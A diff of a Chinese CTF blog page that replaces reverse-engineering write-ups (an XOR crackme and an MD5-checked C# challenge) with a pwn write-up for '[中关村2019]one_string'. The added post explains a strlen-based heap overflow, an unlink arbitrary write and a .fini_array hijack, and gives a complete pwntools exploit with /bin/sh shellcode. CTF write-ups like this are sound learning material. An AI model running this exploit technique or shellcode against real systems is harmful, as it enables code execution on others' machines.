@@ -15,17 +15,17 @@
 
 
 
-<meta name="description" content="identifyida打开，搜索字符串，找到了提示错误用户名和密码的字符串，并由此找到了关键函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798">
+<meta name="description" content="buuoj上面做的">
 <meta property="og:type" content="article">
-<meta property="og:title" content="MCTF2018-2">
-<meta property="og:url" content="http://yoursite.com/2018/10/30/MCTF2018-2/index.html">
+<meta property="og:title" content="[中关村2019]one_string">
+<meta property="og:url" content="http://yoursite.com/2019/09/24/中关村2019-one-string/index.html">
 <meta property="og:site_name" content="4eriri&#39;s blog">
-<meta property="og:description" content="identifyida打开，搜索字符串，找到了提示错误用户名和密码的字符串，并由此找到了关键函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798">
+<meta property="og:description" content="buuoj上面做的">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2018-10-31T07:51:29.000Z">
+<meta property="og:updated_time" content="2019-09-24T14:12:02.608Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="MCTF2018-2">
-<meta name="twitter:description" content="identifyida打开，搜索字符串，找到了提示错误用户名和密码的字符串，并由此找到了关键函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798">
+<meta name="twitter:title" content="[中关村2019]one_string">
+<meta name="twitter:description" content="buuoj上面做的">
 
 <link rel="apple-touch-icon" href="/apple-touch-icon.png">
 
@@ -57,7 +57,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>MCTF2018-2 | 4eriri&#39;s blog</title>
+<title>[中关村2019]one_string | 4eriri&#39;s blog</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -200,11 +200,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-MCTF2018-2" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-中关村2019-one-string" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2018/10/30/MCTF2018-2/" class="article-date">
-      <time datetime="2018-10-30T15:15:37.000Z" itemprop="datePublished">2018-10-30</time>
+      <a href="/2019/09/24/中关村2019-one-string/" class="article-date">
+      <time datetime="2019-09-24T13:48:42.000Z" itemprop="datePublished">2019-09-24</time>
 </a>
 
 
@@ -219,7 +219,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      MCTF2018-2
+      [中关村2019]one_string
     </h1>
   
 
@@ -236,17 +236,15 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h1 id="identify"><a href="#identify" class="headerlink" title="identify"></a>identify</h1><p>ida打开，搜索字符串，找到了提示错误用户名和密码的字符串，并由此找到了关键函数：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line">v17 = xmmword_402210;</span><br><span class="line">  v18 = xmmword_402200;</span><br><span class="line">  v2 = &quot;WELCOME TO MCTF\n&quot;;</span><br><span class="line">  v19 = xmmword_402220;</span><br><span class="line">  v3 = aWelcomeToMctf[0];</span><br><span class="line">  v23 = 0xF5;</span><br><span class="line">  v25 = 0;</span><br><span class="line">  v20 = xmmword_4021F0;</span><br><span class="line">  v21 = xmmword_402240;</span><br><span class="line">  v22 = xmmword_402230;</span><br><span class="line">  for ( i = 0i64; *v2; v3 = *v2 )</span><br><span class="line">  &#123;</span><br><span class="line">    putchar(v3);</span><br><span class="line">    ++v2;</span><br><span class="line">    fflush(0);</span><br><span class="line">    Sleep(0x64u);</span><br><span class="line">  &#125;</span><br><span class="line">  if ( a2 == 3 )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_401040(&quot;~checking:&quot;);</span><br><span class="line">    sub_401080();</span><br><span class="line">    v5 = strcmp(*(const char **)(a3 + 4), &quot;Mirage&quot;);</span><br><span class="line">    if ( v5 )</span><br><span class="line">      v5 = -(v5 &lt; 0) | 1;</span><br><span class="line">    if ( v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_401040(&quot;Incorrect username\n&quot;);</span><br><span class="line">      sub_401010(&quot;fail\n&quot;);</span><br><span class="line">      system(&quot;pause&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    sub_401040(&quot;\nCorrect Username\n&quot;);</span><br><span class="line">    v6 = *(const char **)(a3 + 8);</span><br><span class="line">    v7 = 0;</span><br><span class="line">    if ( strlen(v6) )</span><br><span class="line">    &#123;</span><br><span class="line">      do</span><br><span class="line">      &#123;</span><br><span class="line">        v9 = v7 &amp; 0x80000001;</span><br><span class="line">        v8 = (v7 &amp; 0x80000001) == 0;</span><br><span class="line">        if ( (v7 &amp; 0x80000001 &amp; 0x80000000) != 0 )</span><br><span class="line">        &#123;</span><br><span class="line">          v10 = ((_BYTE)v9 - 1) | 0xFFFFFFFE;</span><br><span class="line">          v8 = v10 == -1;</span><br><span class="line">          v9 = v10 + 1;</span><br><span class="line">        &#125;</span><br><span class="line">        if ( v8 )</span><br><span class="line">        &#123;</span><br><span class="line">          if ( (v6[v7] ^ 0x88) != *((_DWORD *)&amp;v17 + v7) )</span><br><span class="line">          &#123;</span><br><span class="line">            v11 = &quot;\nIncorrect password\n&quot;;</span><br><span class="line">            v12 = 10;</span><br><span class="line">            do</span><br><span class="line">            &#123;</span><br><span class="line">              putchar(v12);</span><br><span class="line">              ++v11;</span><br><span class="line">              fflush(0);</span><br><span class="line">              Sleep(0x64u);</span><br><span class="line">              v12 = *v11;</span><br><span class="line">            &#125;</span><br><span class="line">            while ( *v11 );</span><br><span class="line">            sub_401010(&quot;fail\n&quot;);</span><br><span class="line">            goto LABEL_25;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else if ( v9 == 1 &amp;&amp; (v6[v7] ^ 0x66) != *((_DWORD *)&amp;v17 + v7) )</span><br><span class="line">        &#123;</span><br><span class="line">          sub_401040(&quot;\nIncorrect password\n&quot;);</span><br><span class="line">          sub_401010(&quot;fail\n&quot;);</span><br><span class="line">          goto LABEL_25;</span><br><span class="line">        &#125;</span><br><span class="line">        ++v7;</span><br><span class="line">      &#125;</span><br><span class="line">      while ( v7 &lt; strlen(v6) );</span><br><span class="line">    &#125;</span><br><span class="line">    v13 = &quot;~checking:&quot;;</span><br><span class="line">    v14 = 126;</span><br><span class="line">    do</span><br><span class="line">    &#123;</span><br><span class="line">      putchar(v14);</span><br><span class="line">      ++v13;</span><br><span class="line">      fflush(0);</span><br><span class="line">      Sleep(0x64u);</span><br><span class="line">      v14 = *v13;</span><br><span class="line">    &#125;</span><br><span class="line">    while ( *v13 );</span><br><span class="line">    sub_401080();</span><br><span class="line">    v15 = &quot;\nCongratulations!\n&quot;;</span><br><span class="line">    v16 = 10;</span><br><span class="line">    do</span><br><span class="line">    &#123;</span><br><span class="line">      putchar(v16);</span><br><span class="line">      ++v15;</span><br><span class="line">      fflush(0);</span><br><span class="line">      Sleep(0x64u);</span><br><span class="line">      v16 = *v15;</span><br><span class="line">    &#125;</span><br><span class="line">    while ( *v15 );</span><br><span class="line">    sub_401010(&quot;success\n&quot;);</span><br><span class="line">LABEL_25:</span><br><span class="line">    system(&quot;pause&quot;);</span><br><span class="line">    result = 0;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    sub_401010(&quot;[ERROR] Login information missing\n&quot;);</span><br><span class="line">    sub_401010(&quot;Usage: %s &lt;username&gt; &lt;password&gt;\n&quot;, *(_DWORD *)a3);</span><br><span class="line">    result = 1;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br></pre></td></tr></table></figure>
-<p>显然用户名是Mirage，而密码就需要进行异或运算了。</p>
-<p>密码下标为偶数的部分异或0x88后与固定字符串相等。</p>
-<p>密码下标为奇数的部分异或0x66后与固定字符串相等。</p>
-<p>逆运算脚本如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">key=[0xc5,0x25,0xdc,0x20,0xf3,0x3e,0xb8,0x14,0xd7,0x57,0xfb,0x39,0xf9,0x13,0xb9,0x12,0xed,0x39,0xfb,0x57,0xe5,0x16,0xe4,0x53,0xf5]</span><br><span class="line">flag=&quot;&quot;</span><br><span class="line">for i in range(len(key)):</span><br><span class="line">    if i&amp;1 == 0:</span><br><span class="line">	   flag+=chr(key[i]^0x88)</span><br><span class="line">    if i&amp;1 == 1:</span><br><span class="line">        flag+=chr(key[i]^0x66)</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure>
-<h1 id="吃鲨鱼"><a href="#吃鲨鱼" class="headerlink" title="吃鲨鱼"></a>吃鲨鱼</h1><p>peid看了一下发现是c#，拖进dnspy：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">private void button1_Click(object sender, EventArgs e)</span><br><span class="line">		&#123;</span><br><span class="line">			string text = this.textBox1.Text;</span><br><span class="line">			string[] array = new string[]</span><br><span class="line">			&#123;</span><br><span class="line">				&quot;69691c7bdcc3ce6d5d8a1361f22d04ac&quot;,</span><br><span class="line">				&quot;0d61f8370cad1d412f80b84d143e1257&quot;,</span><br><span class="line">				&quot;b9ece18c950afbfa6b0fdbfa4ff731d3&quot;,</span><br><span class="line">				&quot;800618943025315f869e4e1f09471012&quot;,</span><br><span class="line">				&quot;f95b70fdc3088560732a5ac135644506&quot;,</span><br><span class="line">				&quot;4a8a08f09d37b73795649038408b5f33&quot;,</span><br><span class="line">				&quot;03c7c0ace395d80182db07ae2c30f034&quot;,</span><br><span class="line">				&quot;2510c39011c5be704182423e3a695e91&quot;,</span><br><span class="line">				&quot;0cc175b9c0f1b6a831c399e269772661&quot;,</span><br><span class="line">				&quot;4b43b0aee35624cd95b910189b3dc231&quot;,</span><br><span class="line">				&quot;83878c91171338902e0fe0fb97a8c47a&quot;,</span><br><span class="line">				&quot;b14a7b8059d9c055954c92674ce60032&quot;,</span><br><span class="line">				&quot;6f8f57715090da2632453988d9a1501b&quot;,</span><br><span class="line">				&quot;8277e0910d750195b448797616e091ad&quot;,</span><br><span class="line">				&quot;e4da3b7fbbce2345d7772b0674a318d5&quot;,</span><br><span class="line">				&quot;cbb184dd8e05c9709e5dcaedaa0495cf&quot;</span><br><span class="line">			&#125;;</span><br><span class="line">			if (text.Length &gt; 16)</span><br><span class="line">			&#123;</span><br><span class="line">				this.label2.Text = &quot;You are wrong!&quot;;</span><br><span class="line">				return;</span><br><span class="line">			&#125;</span><br><span class="line">			for (int i = 0; i &lt; text.Length; i++)</span><br><span class="line">			&#123;</span><br><span class="line">				char[] array2 = new char[]</span><br><span class="line">				&#123;</span><br><span class="line">					&apos;H&apos;</span><br><span class="line">				&#125;;</span><br><span class="line">				array2[0] = text[i];</span><br><span class="line">				string str = new string(array2);</span><br><span class="line">				if (array[i].CompareTo(Form1.fivefive(str)) != 0)</span><br><span class="line">				&#123;</span><br><span class="line">					this.label2.Text = &quot;You are wrong!&quot;;</span><br><span class="line">				&#125;</span><br><span class="line">				else</span><br><span class="line">				&#123;</span><br><span class="line">					this.label2.Text = &quot;You are right!&quot;;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
-<p>找到了这里，并且发现程序中有一些地方出现了md5，把定义的array的每个字符串md5解密一下得到了flag。</p>
-<h1 id="Math-for-kids"><a href="#Math-for-kids" class="headerlink" title="Math for kids"></a>Math for kids</h1>
+        <p>buuoj上面做的</p>
+<a id="more"></a>
+<p>edit的时候，会重新记录size，这个size使用strlen计算。</p>
+<p>如果申请一个可以复用下一个chunk的presize段的chunk，然后使用edit填充满，这样再下一次edit时使用的size就可以覆盖掉下一个chunk的size。</p>
+<p>然后构造unlink，就可以任意写。</p>
+<p>可是不知道咋控制程序执行流，甚至想在<code>malloc_hook上</code>写bss段地址，然后在bss段地址上写shellcode来执行，然后不知道哪里出了问题没啥卵用。</p>
+<p>最终<a href="https://wulidecade.cn/2019/08/16/中关村第三届新兴领域专题赛WP/" target="_blank" rel="noopener">参考了Decade表哥的wp</a>，修改<code>.fini_array</code>来控制程序执行流。</p>
+<p><code>.fini_array</code>数组，里面保存着程序执行完之后执行的函数，这里的思路是可以覆盖<code>.fini_array</code>数组的内容来控制程序执行流程。有一点需要注意的是<code>.fini_array</code>数组里保存的函数是逆序执行的，也就是说会先执行<code>.fini_array[1]</code>再执行<code>.fini_array[0]</code>。例如可以将<code>.fini_array[1]</code>的值改为main函数的地址，将<code>.fini_array[0]</code>改成调用控制<code>.fini_array</code>的函数0x402960，这样执行完main之后就执行又继续执行调用main函数的函数。这样就可以形成循环一直任意地址覆盖写。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *from LibcSearcher import *sh=process(&quot;./pwn-2.dms&quot;)#sh=remote(&quot;node2.buuoj.cn.wetolink.com&quot;,28568)sh.recvuntil(&quot;input:\n&quot;)def add(index,content):	sh.sendline(&quot;1&quot;)	sh.sendline(str(int(index)))	sh.sendline(content)def delete(index):	sh.sendline(&quot;2&quot;)	sh.sendline(str(int(index)))def edit(index,content):	sh.sendline(&quot;3&quot;)	sh.sendline(str(int(index)))	sh.sendline(content)size=0x080EBA00ptr=0x80eba40+12shellcode  = &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;shellcode += &quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;shellcode += &quot;\x0b\xcd\x80&quot;add(0x20,&apos;\xff&apos;)#0add(0x18,&apos;\xff&apos;)#1add(0x18,&apos;\xff&apos;)#2add(0x64,p32(0)+p32(0x60)+p32(0xffffffff)*24)#3add(0x60,&apos;\xff&apos;)#4add(0x18,&apos;\xff&apos;)#5edit(3,p32(0xffffffff)*25)edit(3,p32(0xffffffff)+p32(0x61)+p32(ptr-12)+p32(ptr-8)+p32(0xffffffff)*20+p32(0x60)+p32(0x68))delete(4)edit(3,p32(0x80e9f74))edit(0,p32(0)+p32(0x80e9f7c)+shellcode+&apos;\x00&apos;)sh.interactive()</span><br></pre></td></tr></table></figure>
       
     </div>
     
@@ -254,13 +252,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2018/10/30/MCTF2018-2/">MCTF2018-2</a></p>
+        <p><span>本文标题:</span><a href="/2019/09/24/中关村2019-one-string/">[中关村2019]one_string</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">4eriri</a></p>
-        <p><span>发布时间:</span>2018-10-30, 23:15:37</p>
-        <p><span>最后更新:</span>2018-10-31, 15:51:29</p>
+        <p><span>发布时间:</span>2019-09-24, 21:48:42</p>
+        <p><span>最后更新:</span>2019-09-24, 22:12:02</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2018/10/30/MCTF2018-2/" title="MCTF2018-2">http://yoursite.com/2018/10/30/MCTF2018-2/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2018/10/30/MCTF2018-2/　　作者: 4eriri" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2019/09/24/中关村2019-one-string/" title="[中关村2019]one_string">http://yoursite.com/2019/09/24/中关村2019-one-string/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2019/09/24/中关村2019-one-string/　　作者: 4eriri" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -272,16 +270,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2018/10/31/MOCTF-1/">
-                    MOCTF-1
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2018/10/27/MCTF2018-1/">
-                    MCTF2018-1
+                <a href="/2019/09/23/ciscn-2019-final-5/">
+                    ciscn_2019_final_5
                 </a>
             </div>
         
@@ -293,7 +285,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#identify"><span class="toc-number">1.</span> <span class="toc-text">identify</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#吃鲨鱼"><span class="toc-number">2.</span> <span class="toc-text">吃鲨鱼</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Math-for-kids"><span class="toc-number">3.</span> <span class="toc-text">Math for kids</span></a></li></ol>
+            
         
     </div>
     <style>
@@ -329,7 +321,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"MCTF2018-2　| 4eriri's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"[中关村2019]one_string　| 4eriri's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -348,8 +340,8 @@
     <div id="disqus_thread"></div>
     <script>
         var disqus_config = function(){
-            this.page.url = 'http://yoursite.com/2018/10/30/MCTF2018-2/';
-            this.page.identifier = '2018/10/30/MCTF2018-2/';
+            this.page.url = 'http://yoursite.com/2019/09/24/中关村2019-one-string/';
+            this.page.identifier = '2019/09/24/中关村2019-one-string/';
         };
         var loadComment = function(){
             var d = document, s = d.createElement('script');
@@ -371,15 +363,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2018/10/31/MOCTF-1/" title="上一篇: MOCTF-1">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2018/10/27/MCTF2018-1/" title="下一篇: MCTF2018-1">
+            <a href="/2019/09/23/ciscn-2019-final-5/" title="下一篇: ciscn_2019_final_5">
                 <i class="fa fa-angle-right"></i>
             </a>
         
